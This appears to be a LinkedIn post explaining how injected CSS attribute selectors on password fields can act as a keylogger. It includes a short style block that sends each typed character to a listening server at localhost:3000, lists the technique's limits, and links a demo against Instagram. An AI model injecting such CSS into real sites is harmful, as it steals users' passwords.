Did you know you can use [#CSS](https://www.linkedin.com/feed/hashtag/?keywords=css&highlightedUpdateUrns=urn%3Ali%3Aactivity%3A6996842844975964161) as a Keylogger? So those HTML injections may just serve a purpose after all!  
   
I came across this attack for the first time a couple of days ago and found it super interesting. It works by using the below code:  
   
<style>  
input[type="password"][value$="a"] {  
 background-image: url("http[:]//localhost[:]3000/a");  
}  
   
input[type="password"][value$="b"] {  
  background-image: url("http[:]//localhost[:]3000/b");  
}  
</style>  
   
This code is looking at input fields of the type ‘password’. Any time a character is entered into a password field, the CSS Attribute Selector correlated to that character will be triggered, which loads an attacker domain with the character requested in the URL. So, an attacker just has to review their web server access logs to see, character by character, the user’s entire password!  
   
This exotic attack vector does have some limitations. Per the article linked in the comments:  
   
-It only works with an initial value being set on an input, and not per keypress nor after blurring the field.  
  
-It’s not triggered for values that have been autocompleted by the browser’s credentials manager or a password manager tool.  
  
-It cannot handle repeat characters, as the browser won’t re-request the background image in that case  
  
-Due to parallelism, it’s not guaranteed for the requests to be received by the server in the order they were typed in  
  
But since React (by default) updates the input value upon every change, this attack is worth stashing in your arsenal. Here is a repo that demos this with Instagram: [https://lnkd.in/ejzHZwCg](https://lnkd.in/ejzHZwCg)  
   
Hit me with a like if you didn’t know this was possible!